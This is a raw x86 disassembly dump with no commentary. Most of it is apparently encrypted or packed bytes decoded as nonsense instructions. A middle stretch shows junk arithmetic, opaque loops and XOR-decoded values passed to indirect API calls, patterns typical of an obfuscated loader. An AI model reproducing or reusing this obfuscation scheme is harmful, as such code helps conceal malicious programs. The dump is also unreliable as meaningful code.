  40b0d2:	jbe    0x40b086
  40b0d4:	lock into 
  40b0d6:	sub    DWORD PTR [edx-0x71fae94e],esp
  40b0dc:	dec    ebx
  40b0dd:	adc    DWORD PTR [ecx-0x6a],edx
  40b0e0:	dec    ebx
  40b0e1:	mov    ecx,0x21e7ce24
  40b0e6:	dec    eax
  40b0e7:	dec    esi
  40b0e8:	popf   
  40b0e9:	loope  0x40b10d
  40b0eb:	ins    DWORD PTR es:[edi],dx
  40b0ec:	xchg   BYTE PTR [edi+0x3a],dl
  40b0ef:	outs   dx,DWORD PTR ds:[esi]
  40b0f0:	sbb    al,0xe7
  40b0f2:	(bad)  
  40b0f3:	mov    cl,0x2f
  40b0f5:	(bad)  
  40b0f6:	sbb    eax,0x600efed5
  40b0fb:	ja     0x40b0a4
  40b0fd:	push   cs
  40b0fe:	pusha  
  40b0ff:	int3   
  40b100:	jmp    0x40b165
  40b102:	jecxz  0x40b123
  40b104:	ret    0xeff9
  40b107:	inc    ebx
  40b108:	shl    DWORD PTR [eax],1
  40b10a:	cmp    edi,DWORD PTR [edx-0x160c6303]
  40b110:	jl     0x40b16c
  40b112:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b114:	and    cl,BYTE PTR [edi]
  40b116:	adc    dh,BYTE PTR [eax+0x3fa089df]
  40b11c:	adc    al,0x36
  40b11e:	jmp    0x9bd937ab
  40b123:	jae    0x40b19c
  40b125:	out    dx,eax
  40b126:	outs   dx,DWORD PTR ds:[esi]
  40b127:	cld    
  40b128:	push   esp
  40b129:	cdq    
  40b12a:	aaa    
  40b12b:	cs cld 
  40b12d:	push   ebp
  40b12e:	ins    BYTE PTR es:[edi],dx
  40b12f:	mov    bl,0x28
  40b131:	shl    BYTE PTR [eax],0xd7
  40b134:	pop    es
  40b135:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b136:	inc    esi
  40b137:	mov    esi,0x5413188a
  40b13c:	sub    BYTE PTR [eax],0x5c
  40b13f:	xchg   edx,eax
  40b140:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b141:	or     edx,DWORD PTR [ebp-0x6f]
  40b144:	js     0x40b131
  40b146:	lods   eax,DWORD PTR ds:[esi]
  40b147:	idiv   DWORD PTR [eax+ebp*1]
  40b14a:	jne    0x40b137
  40b14c:	lea    ebp,[ecx]
  40b14e:	scas   al,BYTE PTR es:[edi]
  40b14f:	scas   al,BYTE PTR es:[edi]
  40b150:	shl    DWORD PTR [edi+0xd],1
  40b153:	(bad)  
  40b154:	pop    esp
  40b155:	sti    
  40b156:	push   es
  40b157:	test   eax,0x4343adff
  40b15c:	add    eax,0xbda3677c
  40b161:	loopne 0x40b17a
  40b163:	and    dl,BYTE PTR [ebp-0x54]
  40b166:	call   0xc7d9:0x61500fc9
  40b16d:	or     DWORD PTR [ecx],edx
  40b16f:	inc    ax
  40b171:	push   0x8831e8fa
  40b176:	imul   ebp,DWORD PTR [edx+0x68],0xfffffffe
  40b17a:	push   ds
  40b17b:	aam    0x84
  40b17d:	in     eax,dx
  40b17e:	sub    dl,BYTE PTR [eax+0x6c]
  40b181:	add    al,0x4c
  40b183:	mov    edi,0x4b0d4067
  40b188:	pop    edi
  40b189:	mov    ds:0xc32942dc,eax
  40b18e:	(bad)  
  40b18f:	mov    dl,0x5c
  40b191:	xchg   ebp,eax
  40b192:	cmp    cl,0xc3
  40b195:	addr16 loop 0x40b186
  40b198:	sub    eax,esi
  40b19a:	rcl    bl,cl
  40b19c:	jmp    0x9fb0:0xed8ffb44
  40b1a3:	out    dx,al
  40b1a4:	xor    BYTE PTR [edi-0x2c57fc08],dl
  40b1aa:	mov    edi,0x139e71b4
  40b1af:	push   ds
  40b1b0:	sub    al,0xb1
  40b1b2:	mov    cl,0x9a
  40b1b4:	scas   eax,DWORD PTR es:[edi]
  40b1b5:	inc    edi
  40b1b6:	push   edx
  40b1b7:	enter  0x422b,0x2c
  40b1bb:	(bad)  
  40b1bc:	jg     0x40b157
  40b1be:	imul   eax,esp,0x66
  40b1c1:	jecxz  0x40b228
  40b1c3:	(bad)  
  40b1c4:	xlat   BYTE PTR ds:[ebx]
  40b1c5:	rcr    edi,0xf6
  40b1c8:	popf   
  40b1c9:	es push ss
  40b1cb:	jmp    0x7bae:0x992c6c69
  40b1d2:	xchg   ebx,eax
  40b1d3:	push   es
  40b1d4:	sti    
  40b1d5:	outs   dx,BYTE PTR ds:[esi]
  40b1d6:	outs   dx,DWORD PTR gs:[esi]
  40b1d8:	fild   WORD PTR [ebx+0x2810c713]
  40b1de:	stos   DWORD PTR es:[edi],eax
  40b1df:	ss xchg esi,eax
  40b1e1:	fisttp QWORD PTR [ebx-0x37880a0a]
  40b1e7:	mov    ch,bl
  40b1e9:	cmc    
  40b1ea:	push   ss
  40b1eb:	xchg   edi,eax
  40b1ec:	dec    DWORD PTR [ecx+0x19]
  40b1ef:	add    ecx,ecx
  40b1f1:	push   eax
  40b1f2:	and    al,0xba
  40b1f4:	ret    0xf3a
  40b1f7:	fidivr DWORD PTR [edi-0x3aeee98]
  40b1fd:	sub    bl,BYTE PTR [esi-0x36]
  40b200:	(bad)  
  40b201:	xchg   esi,eax
  40b202:	popa   
  40b203:	dec    edx
  40b204:	mov    cl,0x3d
  40b206:	pop    ss
  40b207:	(bad)  
  40b208:	sti    
  40b209:	fxtract 
  40b20b:	pusha  
  40b20c:	je     0x40b23a
  40b20e:	pushf  
  40b20f:	es dec ebx
  40b211:	int3   
  40b212:	pop    ecx
  40b213:	mov    ch,0x94
  40b215:	adc    dh,BYTE PTR [ebp-0x16086b26]
  40b21b:	jns    0x40b1a7
  40b21d:	adc    bl,BYTE PTR [ebx]
  40b21f:	bound  edx,QWORD PTR [edi+0x44]
  40b222:	lds    eax,FWORD PTR [esi+0x275be368]
  40b228:	pop    edi
  40b229:	mov    dh,0xfa
  40b22b:	fimul  DWORD PTR [ebx]
  40b22d:	lock std 
  40b22f:	enter  0x3979,0x4a
  40b233:	into   
  40b234:	mov    esp,0xa1ae9eeb
  40b239:	cwde   
  40b23a:	sti    
  40b23b:	stc    
  40b23c:	inc    ebp
  40b23d:	adc    edx,esi
  40b23f:	cmp    eax,0xb13365dc
  40b244:	sub    esp,edx
  40b246:	jno    0x40b210
  40b248:	daa    
  40b249:	lahf   
  40b24a:	push   esi
  40b24b:	test   al,0xfd
  40b24d:	cs add ch,ah
  40b250:	out    0x17,eax
  40b252:	imul   BYTE PTR [eax]
  40b254:	xor    BYTE PTR [edi+ebx*1+0x50],dl
  40b258:	addr16 in al,dx
  40b25a:	inc    eax
  40b25b:	es gs dec esp
  40b25e:	adc    dh,BYTE PTR [eax+eax*8-0x5d88e980]
  40b265:	inc    ebp
  40b266:	retf   0x879e
  40b269:	(bad)  [esi+eiz*2+0xbfe8e68]
  40b270:	cld    
  40b271:	call   0xa322:0x41607f9b
  40b278:	mov    al,ds:0xf1126310
  40b27d:	(bad)  
  40b27e:	fmul   st,st(2)
  40b280:	jp     0x40b2a2
  40b282:	push   ss
  40b283:	xor    al,BYTE PTR [ecx-0x58896eb4]
  40b289:	cmp    al,0xb7
  40b28b:	and    BYTE PTR [eax+0x3df0416b],al
  40b291:	je     0x40b27d
  40b293:	outs   dx,DWORD PTR ds:[esi]
  40b294:	push   eax
  40b295:	fisub  DWORD PTR [esi]
  40b297:	mov    ds,ebp
  40b299:	icebp  
  40b29a:	es push ds
  40b29c:	pop    ds
  40b29d:	xlat   BYTE PTR ds:[ebx]
  40b29e:	inc    ebp
  40b29f:	call   0x453b311c
  40b2a4:	xchg   ah,al
  40b2a6:	pop    ecx
  40b2a7:	jmp    0x40b24e
  40b2a9:	outs   dx,BYTE PTR ds:[esi]
  40b2aa:	bnd jae 0x40b29a
  40b2ad:	xor    eax,0x4a56d553
  40b2b2:	jl     0x40b2ff
  40b2b4:	in     al,0xb8
  40b2b6:	mov    ds:0x3185b194,eax
  40b2bb:	popf   
  40b2bc:	repz fmul st,st(0)
  40b2bf:	adc    eax,0x47c9e196
  40b2c4:	dec    edi
  40b2c5:	loopne 0x40b2af
  40b2c7:	lds    ecx,FWORD PTR [edi-0x26221b93]
  40b2cd:	pushf  
  40b2ce:	adc    DWORD PTR [ebp+0x5d003dc9],0xffffffba
  40b2d5:	pop    esi
  40b2d6:	mov    ebp,0x26faf2ce
  40b2db:	cmp    eax,0xb8baf4ba
  40b2e0:	imul   ebx,DWORD PTR [edi+ecx*2-0x41ae5862],0xf3150566
  40b2eb:	sub    eax,DWORD PTR ds:0xf99e6e9f
  40b2f1:	mov    ds:0x93cf00ea,al
  40b2f6:	jmp    0x512:0x29a3d499
  40b2fd:	sub    DWORD PTR [ecx+0x4ecdc78a],ebx
  40b303:	sub    DWORD PTR [eax+0x1b29c883],edi
  40b309:	adc    eax,0xb3cc526c
  40b30e:	out    0xcd,al
  40b310:	xchg   ebp,eax
  40b311:	(bad)  [ebx]
  40b313:	test   dl,dh
  40b315:	enter  0xf088,0xf3
  40b319:	push   ss
  40b31a:	pop    esp
  40b31b:	xchg   ebx,eax
  40b31c:	sbb    BYTE PTR [edx+0x1ab2c434],bl
  40b322:	cld    
  40b323:	clc    
  40b324:	add    ah,0xc8
  40b327:	das    
  40b328:	and    ecx,ebx
  40b32a:	cmp    BYTE PTR [edi+0x3f],bh
  40b32d:	std    
  40b32e:	ret    
  40b32f:	das    
  40b330:	pop    eax
  40b331:	mov    bl,0xa5
  40b333:	jnp    0x40b313
  40b335:	pop    esi
  40b336:	xchg   esi,eax
  40b337:	and    edi,DWORD PTR [ecx+ecx*8]
  40b33a:	jbe    0x40b2c9
  40b33c:	addr16 hlt 
  40b33e:	xor    ch,BYTE PTR [ecx-0x4df849a]
  40b344:	outs   dx,DWORD PTR ds:[esi]
  40b345:	jp     0x40b3b1
  40b347:	cmc    
  40b348:	ja     0x40b3ba
  40b34a:	pop    ds
  40b34b:	pop    esi
  40b34c:	inc    ebx
  40b34d:	test   eax,0x9ebd99ec
  40b352:	fdivr  DWORD PTR [edi]
  40b354:	outs   dx,BYTE PTR ds:[esi]
  40b355:	in     al,dx
  40b356:	inc    ebx
  40b357:	dec    eax
  40b358:	std    
  40b359:	jecxz  0x40b34d
  40b35b:	jo     0x40b32d
  40b35d:	fidivr WORD PTR es:[ecx-0x41]
  40b361:	xchg   edi,eax
  40b362:	inc    esp
  40b363:	popf   
  40b364:	idiv   BYTE PTR [ebp-0x26afa354]
  40b36a:	ins    BYTE PTR es:[edi],dx
  40b36b:	xchg   esp,eax
  40b36c:	outs   dx,DWORD PTR ds:[esi]
  40b36d:	inc    edi
  40b36e:	jo     0x40b37f
  40b370:	icebp  
  40b371:	sub    BYTE PTR [edi+0x34],dh
  40b374:	loop   0x40b307
  40b376:	inc    ebx
  40b377:	bound  eax,QWORD PTR [ebx]
  40b379:	ins    DWORD PTR es:[edi],dx
  40b37a:	adc    ebp,ebx
  40b37c:	xchg   edi,eax
  40b37d:	push   0x99191487
  40b382:	test   eax,0x70e4568e
  40b387:	loopne 0x40b3b5
  40b389:	ret    0x5553
  40b38c:	sub    al,ch
  40b38e:	xchg   ebx,eax
  40b38f:	add    BYTE PTR [ebx],0x5f
  40b392:	inc    esp
  40b393:	or     eax,0xf298f396
  40b398:	push   esp
  40b399:	jmp    0x6d2b6ee7
  40b39e:	push   eax
  40b39f:	adc    DWORD PTR [eax],edi
  40b3a1:	xor    DWORD PTR es:[eax],0xffffffca
  40b3a5:	or     DWORD PTR [ebx-0x12],0xf4fcf5f9
  40b3ac:	aas    
  40b3ad:	shr    BYTE PTR [eax-0x64c43a7f],cl
  40b3b3:	jo     0x40b3fa
  40b3b5:	sbb    DWORD PTR [esp+ebp*8+0x72],ebp
  40b3b9:	lea    edx,[ebx-0x4b3c6e1b]
  40b3bf:	sbb    ebp,DWORD PTR [ecx]
  40b3c1:	cmovno ebp,DWORD PTR [esi+eax*2-0x3b]
  40b3c6:	or     esp,ebp
  40b3c8:	out    dx,al
  40b3c9:	out    0x3c,al
  40b3cb:	sar    DWORD PTR cs:[ebx+0x5c],cl
  40b3cf:	imul   edx,ebp,0x531333a6
  40b3d5:	daa    
  40b3d6:	aaa    
  40b3d7:	mov    dl,al
  40b3d9:	ins    BYTE PTR es:[edi],dx
  40b3da:	mov    al,0x4d
  40b3dc:	fdivr  DWORD PTR [edx]
  40b3de:	pop    eax
  40b3df:	and    cl,ch
  40b3e1:	addr16 push ebx
  40b3e3:	fucomp st(0)
  40b3e5:	sbb    bl,bl
  40b3e7:	jnp    0x40b3c6
  40b3e9:	xchg   edi,eax
  40b3ea:	shl    DWORD PTR [esi],cl
  40b3ec:	xor    eax,0xc8b335c7
  40b3f1:	je     0x40b43c
  40b3f3:	js     0x40b3c4
  40b3f5:	out    dx,eax
  40b3f6:	adc    al,0x23
  40b3f8:	ror    BYTE PTR [edi+0x2211973a],cl
  40b3fe:	out    dx,al
  40b3ff:	cmp    DWORD PTR [ebx-0x1a],ecx
  40b402:	inc    ecx
  40b403:	leave  
  40b404:	push   es
  40b405:	(bad)  
  40b406:	cdq    
  40b407:	sub    eax,0xcae75003
  40b40c:	lock jmp 0x40b459
  40b40f:	loope  0x40b43a
  40b411:	xchg   ebx,eax
  40b412:	and    eax,0x85d0061
  40b417:	aaa    
  40b418:	clc    
  40b419:	sbb    ebp,DWORD PTR [edx-0x3051e4e9]
  40b41f:	div    DWORD PTR [ecx]
  40b421:	outs   dx,BYTE PTR ds:[esi]
  40b422:	data16 mov al,ds:0x239125f4
  40b428:	mov    ds:0x2a42ef3c,al
  40b42d:	sbb    al,BYTE PTR [ebp+0x43f82085]
  40b433:	call   0x1d625c6f
  40b438:	pop    esp
  40b439:	out    0x69,al
  40b43b:	mov    al,0xb9
  40b43d:	adc    ah,BYTE PTR [eax]
  40b43f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b440:	stos   BYTE PTR es:[edi],al
  40b441:	bound  ebp,QWORD PTR [esi-0x21]
  40b444:	and    eax,0xcb969ad4
  40b449:	stc    
  40b44a:	lahf   
  40b44b:	(bad)  
  40b44c:	fisub  DWORD PTR [ebx+0x69]
  40b44f:	aad    0x36
  40b451:	xlat   BYTE PTR ds:[ebx]
  40b452:	loop   0x40b3ec
  40b454:	add    DWORD PTR [ebp+0x5e],0x3f317d3b
  40b45b:	scas   al,BYTE PTR es:[edi]
  40b45c:	(bad)  
  40b45d:	mov    WORD PTR [ecx],es
  40b45f:	js     0x40b488
  40b461:	sub    dh,BYTE PTR [eax+0x47]
  40b464:	enter  0x590e,0x87
  40b468:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b469:	cmc    
  40b46a:	lock call 0x6cdc:0xd82413d9
  40b472:	in     al,0x29
  40b474:	push   eax
  40b475:	pop    edx
  40b476:	cwde   
  40b477:	jp     0x40b452
  40b479:	sbb    bh,BYTE PTR [ebx]
  40b47b:	push   eax
  40b47c:	cmp    al,0x3f
  40b47e:	test   esp,esp
  40b480:	aaa    
  40b481:	in     al,0x61
  40b483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b484:	fwait
  40b485:	jp     0x40b47e
  40b487:	dec    edx
  40b488:	inc    esi
  40b489:	mov    ch,0x8b
  40b48b:	jle    0x40b4ab
  40b48d:	xchg   edi,eax
  40b48e:	pop    edx
  40b48f:	fild   QWORD PTR [ebx+0xbe2a433]
  40b495:	dec    esp
  40b496:	xor    edx,edx
  40b498:	pop    edx
  40b499:	icebp  
  40b49a:	imul   edi,DWORD PTR [edx+0x37301e0e],0x15c991c3
  40b4a4:	xor    DWORD PTR [eax],edi
  40b4a6:	gs fwait
  40b4a8:	in     al,0xbd
  40b4aa:	arpl   WORD PTR [eax],bp
  40b4ac:	mov    ecx,0xe0f3bfd1
  40b4b1:	aam    0x3a
  40b4b3:	pop    ds
  40b4b4:	push   ecx
  40b4b5:	test   ch,al
  40b4b7:	adc    DWORD PTR [eax-0x41],edi
  40b4ba:	add    eax,0xcee1a5af
  40b4bf:	test   bh,dl
  40b4c1:	pop    esp
  40b4c3:	push   edi
  40b4c4:	sbb    al,al
  40b4c6:	dec    ebp
  40b4c7:	lods   al,BYTE PTR ds:[esi]
  40b4c8:	ret    0x3335
  40b4cb:	add    al,0xcc
  40b4cd:	adc    dh,BYTE PTR [edx-0x6d7f1e52]
  40b4d3:	les    ax,DWORD PTR [ecx+0x6f]
  40b4d7:	mov    eax,ds:0x2f38e46f
  40b4dc:	imul   ecx,DWORD PTR [esi+0x5313b78],0x38
  40b4e3:	inc    edi
  40b4e4:	stos   BYTE PTR es:[edi],al
  40b4e5:	mov    cl,0xe3
  40b4e7:	stos   DWORD PTR es:[edi],eax
  40b4e8:	lock push esi
  40b4ea:	in     al,dx
  40b4eb:	dec    esp
  40b4ec:	cs stos DWORD PTR es:[edi],eax
  40b4ee:	loope  0x40b470
  40b4f0:	add    DWORD PTR [eax+edx*4],0xffffff98
  40b4f4:	dec    ebx
  40b4f5:	inc    eax
  40b4f6:	out    0xf0,eax
  40b4f8:	test   al,0x34
  40b4fa:	push   es
  40b4fb:	inc    esp
  40b4fc:	jne    0x40b4c2
  40b4fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4ff:	push   edi
  40b500:	pop    ebx
  40b501:	repz fdiv DWORD PTR [ecx]
  40b504:	jae    0x40b487
  40b506:	sbb    dh,BYTE PTR [bp+di+0x7c]
  40b50a:	mov    BYTE PTR [ebp+0x27220c9f],bh
  40b510:	and    ebx,DWORD PTR [edx]
  40b512:	fnsave [edx-0x2c]
  40b515:	inc    esp
  40b516:	mov    ch,BYTE PTR [edx]
  40b518:	dec    eax
  40b519:	outs   dx,DWORD PTR ds:[esi]
  40b51a:	xchg   ebx,eax
  40b51b:	lds    edi,FWORD PTR [eax-0x6f]
  40b51e:	cmp    al,BYTE PTR [edi]
  40b520:	pop    ebx
  40b521:	lods   eax,DWORD PTR ds:[esi]
  40b522:	mov    DWORD PTR [edi+eax*4-0x4a],ebp
  40b526:	jne    0x40b58a
  40b528:	mov    ah,0xf0
  40b52a:	outs   dx,BYTE PTR ds:[esi]
  40b52b:	xchg   DWORD PTR [ecx-0x4344e93],esp
  40b531:	outs   dx,DWORD PTR ds:[esi]
  40b532:	ss mov ebp,0xa9cfc75e
  40b538:	mov    bl,0xf0
  40b53a:	lods   eax,DWORD PTR ds:[esi]
  40b53b:	int3   
  40b53c:	xchg   esp,eax
  40b53d:	dec    edi
  40b53e:	cmp    eax,edx
  40b540:	inc    edx
  40b541:	arpl   WORD PTR [ebx-0x7d074a4d],dx
  40b547:	jb     0x40b5c1
  40b549:	xor    ecx,0x88f7653b
  40b54f:	push   edx
  40b550:	hlt    
  40b551:	test   eax,0x2daf9b3b
  40b556:	aaa    
  40b557:	mov    esp,0x363fe28f
  40b55c:	inc    ebx
  40b55d:	gs dec ebp
  40b55f:	int3   
  40b560:	add    DWORD PTR [eax+0x1fe32a92],edi
  40b566:	mov    dh,0x52
  40b568:	xor    ebp,0xffffffdf
  40b56b:	les    eax,FWORD PTR [eax-0x77e5c528]
  40b571:	ret    0x2d69
  40b574:	xchg   ecx,eax
  40b575:	fidivr WORD PTR [ebp+0x4492f50]
  40b57b:	ficom  DWORD PTR [esi-0x7f]
  40b57e:	(bad)  
  40b57f:	mov    eax,0x57000029
  40b584:	or     edi,DWORD PTR ds:0x42b010
  40b58a:	mov    esi,0x7510893
  40b58f:	or     ecx,ecx
  40b591:	xor    eax,esi
  40b593:	mov    edi,0x3272db
  40b598:	add    eax,edi
  40b59a:	sub    DWORD PTR ds:0x42a018,0x772b
  40b5a4:	mov    DWORD PTR [ebp-0x38],eax
  40b5a7:	mov    eax,ds:0x421792
  40b5ac:	mov    ecx,DWORD PTR ds:0x428008
  40b5b2:	and    DWORD PTR ds:0x42b004,ecx
  40b5b8:	mov    eax,DWORD PTR [eax]
  40b5ba:	mov    DWORD PTR ds:0x42a01c,0x19
  40b5c4:	cmp    DWORD PTR ds:0x42a01c,0x0
  40b5cb:	je     0x40b61b
  40b5d1:	cmp    DWORD PTR ds:0x42a01c,0x4
  40b5d8:	jne    0x40b5ef
  40b5de:	push   0x506a
  40b5e3:	push   DWORD PTR [ebp-0x24]
  40b5e6:	push   DWORD PTR [ebp-0x14]
  40b5e9:	call   DWORD PTR ds:0x424028
  40b5ef:	cmp    DWORD PTR ds:0x42a01c,0x5
  40b5f6:	jne    0x40b609
  40b5fc:	mov    ecx,DWORD PTR ds:0x42a01c
  40b602:	dec    ecx
  40b603:	mov    DWORD PTR ds:0x42a01c,ecx
  40b609:	mov    ecx,DWORD PTR ds:0x42a01c
  40b60f:	dec    ecx
  40b610:	mov    DWORD PTR ds:0x42a01c,ecx
  40b616:	jmp    0x40b5c4
  40b61b:	mov    DWORD PTR [ebp-0x24],eax
  40b61e:	add    DWORD PTR ds:0x428014,ecx
  40b624:	mov    eax,ds:0x42199a
  40b629:	mov    ecx,DWORD PTR ds:0x42170a
  40b62f:	mov    ecx,DWORD PTR [ecx]
  40b631:	adc    DWORD PTR ds:0x42a008,ecx
  40b637:	mov    eax,DWORD PTR [eax]
  40b639:	and    DWORD PTR ds:0x42a01c,0x0
  40b643:	jmp    0x40b655
  40b648:	mov    ecx,DWORD PTR ds:0x42a01c
  40b64e:	inc    ecx
  40b64f:	mov    DWORD PTR ds:0x42a01c,ecx
  40b655:	cmp    DWORD PTR ds:0x42a01c,0x10
  40b65c:	jae    0x40b75b
  40b662:	cmp    DWORD PTR ds:0x42a01c,0x8
  40b669:	jne    0x40b67f
  40b66f:	push   0x4235ce
  40b674:	push   0x42354e
  40b679:	call   DWORD PTR ds:0x424030
  40b67f:	cmp    DWORD PTR ds:0x42a01c,0x7
  40b686:	jne    0x40b69b
  40b68c:	xor    ecx,ecx
  40b68e:	xor    ecx,DWORD PTR ds:0x42a01c
  40b694:	inc    ecx
  40b695:	mov    DWORD PTR ds:0x42a01c,ecx
  40b69b:	jmp    0x40b648
  40b6a0:	and    DWORD PTR ds:0x42901c,0x0
  40b6aa:	jmp    0x40b6bc
  40b6af:	mov    ecx,DWORD PTR ds:0x42901c
  40b6b5:	inc    ecx
  40b6b6:	mov    DWORD PTR ds:0x42901c,ecx
  40b6bc:	cmp    DWORD PTR ds:0x42901c,0x11
  40b6c3:	jae    0x40b75b
  40b6c9:	cmp    DWORD PTR ds:0x42901c,0x7
  40b6d0:	jne    0x40b6f6
  40b6d6:	push   DWORD PTR [ebp-0x10]
  40b6d9:	push   DWORD PTR [ebp-0x18]
  40b6dc:	push   0x2cae
  40b6e1:	push   0x19d0
  40b6e6:	push   0x7b35
  40b6eb:	push   0x42c01c
  40b6f0:	call   DWORD PTR ds:0x424038
  40b6f6:	cmp    DWORD PTR ds:0x42901c,0x6
  40b6fd:	jne    0x40b710
  40b703:	mov    ecx,DWORD PTR ds:0x42901c
  40b709:	inc    ecx
  40b70a:	mov    DWORD PTR ds:0x42901c,ecx
  40b710:	jmp    0x40b6af
  40b715:	mov    DWORD PTR ds:0x42c00c,0x11
  40b71f:	cmp    DWORD PTR ds:0x42c00c,0x0
  40b726:	je     0x40b75b
  40b72c:	cmp    DWORD PTR ds:0x42c00c,0x18
  40b733:	jne    0x40b749
  40b739:	push   0x42a008
  40b73e:	push   0x6229
  40b743:	call   DWORD PTR ds:0x42403c
  40b749:	mov    ecx,DWORD PTR ds:0x42c00c
  40b74f:	dec    ecx
  40b750:	mov    DWORD PTR ds:0x42c00c,ecx
  40b756:	jmp    0x40b71f
  40b75b:	mov    DWORD PTR [ebp-0x28],eax
  40b75e:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  40b765:	mov    eax,DWORD PTR [ebp-0x34]
  40b768:	xor    eax,esi
  40b76a:	add    eax,edi
  40b76c:	sbb    DWORD PTR ds:0x42a000,0x3656
  40b776:	mov    DWORD PTR [ebp-0x38],eax
  40b779:	mov    eax,ds:0x421912
  40b77e:	mov    DWORD PTR [ebp-0x38],eax
  40b781:	or     eax,0x6382
  40b786:	mov    eax,DWORD PTR [ebp-0x24]
  40b789:	and    DWORD PTR ds:0x42a008,0x0
  40b793:	mov    ecx,DWORD PTR ds:0x42a008
  40b799:	inc    ecx
  40b79a:	mov    DWORD PTR ds:0x42a008,ecx
  40b7a0:	cmp    DWORD PTR ds:0x42a008,0x9
  40b7a7:	jne    0x40b7bb
  40b7ad:	push   DWORD PTR [ebp-0x14]
  40b7b0:	push   0x423529
  40b7b5:	call   DWORD PTR ds:0x424040
  40b7bb:	cmp    DWORD PTR ds:0x42a008,0x8
  40b7c2:	jne    0x40b7d7
  40b7c8:	xor    ecx,ecx
  40b7ca:	add    ecx,DWORD PTR ds:0x42a008
  40b7d0:	inc    ecx
  40b7d1:	mov    DWORD PTR ds:0x42a008,ecx
  40b7d7:	cmp    DWORD PTR ds:0x42a008,0x17
  40b7de:	jb     0x40b793
  40b7e4:	mov    DWORD PTR [ebp-0x14],eax
  40b7e7:	mov    eax,DWORD PTR [ebp-0x14]
  40b7ea:	dec    DWORD PTR ds:0x42c000
  40b7f0:	push   0x4
  40b7f2:	and    ecx,DWORD PTR ds:0x42a018
  40b7f8:	pop    ecx
  40b7f9:	sbb    DWORD PTR ds:0x42b000,0x429004
  40b803:	sub    ecx,eax
  40b805:	xor    DWORD PTR ds:0x42a01c,0x102e
  40b80f:	add    ecx,DWORD PTR [ebp-0x28]
  40b812:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  40b819:	adc    eax,0x5aaa
  40b81e:	mov    DWORD PTR [ebp-0x20],ecx
  40b821:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  40b82b:	and    DWORD PTR ds:0x428010,0x0
  40b835:	jmp    0x40b848
  40b83a:	xor    eax,eax
  40b83c:	add    eax,DWORD PTR ds:0x428010
  40b842:	inc    eax
  40b843:	mov    ds:0x428010,eax
  40b848:	cmp    DWORD PTR ds:0x428010,0x10
  40b84f:	jae    0x40b88a
  40b855:	cmp    DWORD PTR ds:0x428010,0x9
  40b85c:	jne    0x40b86d
  40b862:	push   0x423540
  40b867:	call   DWORD PTR ds:0x424044
  40b86d:	cmp    DWORD PTR ds:0x428010,0x8
  40b874:	jne    0x40b885
  40b87a:	mov    eax,ds:0x428010
  40b87f:	inc    eax
  40b880:	mov    ds:0x428010,eax
  40b885:	jmp    0x40b83a
  40b88a:	mov    eax,DWORD PTR [ebp-0x14]
  40b88d:	sbb    DWORD PTR ds:0x42a018,0x429014
  40b897:	mov    DWORD PTR [ebp-0x90],eax
  40b89d:	dec    eax
  40b89e:	mov    eax,DWORD PTR [ebp-0x20]
  40b8a1:	mov    DWORD PTR [ebp-0x8c],eax
  40b8a7:	add    DWORD PTR ds:0x42c00c,0x20f
  40b8b1:	mov    eax,DWORD PTR [ebp-0x2c]
  40b8b4:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  40b8be:	xor    eax,esi
  40b8c0:	add    eax,edi
  40b8c2:	mov    DWORD PTR [ebp-0x88],eax
  40b8c8:	lea    eax,[ebp-0x50]
  40b8cb:	or     DWORD PTR ds:0x42b014,0x1a32
  40b8d5:	mov    DWORD PTR [ebp-0x84],eax
  40b8db:	mov    eax,DWORD PTR [ebp-0x94]
  40b8e1:	xor    DWORD PTR ds:0x42b010,0x42a00c
  40b8eb:	xor    eax,esi
  40b8ed:	xor    DWORD PTR ds:0x42900c,0x429018
  40b8f7:	add    eax,edi
  40b8f9:	and    DWORD PTR ds:0x428020,0x42c01c
  40b903:	mov    DWORD PTR [ebp-0x94],eax
  40b909:	and    DWORD PTR ds:0x42a000,0x429010
  40b913:	lea    eax,[ebp-0x94]
  40b919:	adc    DWORD PTR ds:0x42b018,0x42c018
  40b923:	push   eax
  40b924:	movzx  eax,WORD PTR ds:0x42b01c
  40b92b:	add    DWORD PTR ds:0x42a008,eax
  40b931:	mov    eax,DWORD PTR [ebp+0xc]
  40b934:	xor    eax,esi
  40b936:	add    DWORD PTR ds:0x428028,0x2102
  40b940:	add    eax,edi
  40b942:	sub    DWORD PTR ds:0x429010,0x36a
  40b94c:	push   eax
  40b94d:	mov    eax,ds:0x421932
  40b952:	adc    DWORD PTR ds:0x428024,0x6674
  40b95c:	push   0x421888
  40b961:	and    DWORD PTR ds:0x42a014,0x6ed
  40b96b:	push   DWORD PTR [eax]
  40b96d:	add    DWORD PTR ds:0x42a000,0x42900c
  40b977:	call   0x405c6f
  40b97c:	or     eax,DWORD PTR ds:0x42901c
  40b982:	mov    eax,DWORD PTR [ebp-0x14]
  40b985:	and    ecx,0x4079
  40b98b:	mov    ecx,DWORD PTR [ebp-0x20]
  40b98e:	sub    DWORD PTR ds:0x42b01c,0xab5
  40b998:	mov    DWORD PTR [ebp-0x44],ecx
  40b99b:	sbb    DWORD PTR ds:0x42b01c,edi
  40b9a1:	mov    ecx,DWORD PTR [ebp+0x8]
  40b9a4:	jmp    0x40dd19
  40b9a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9aa:	or     ah,bl
  40b9ac:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0xf8136403
  40b9b7:	inc    esi
  40b9b8:	pop    ebx
  40b9b9:	dec    edi
  40b9ba:	hlt    
  40b9bb:	bound  esp,QWORD PTR [edx+0xa]
  40b9be:	pop    edi
  40b9bf:	bound  esp,QWORD PTR [edx+0x59]
  40b9c2:	cmc    
  40b9c3:	stos   BYTE PTR es:[edi],al
  40b9c4:	jnp    0x40b9f6
  40b9c6:	loop   0x40b984
  40b9c8:	sbb    edx,DWORD PTR [ebx+ecx*1+0x2e30fab5]
  40b9cf:	mov    ch,ah
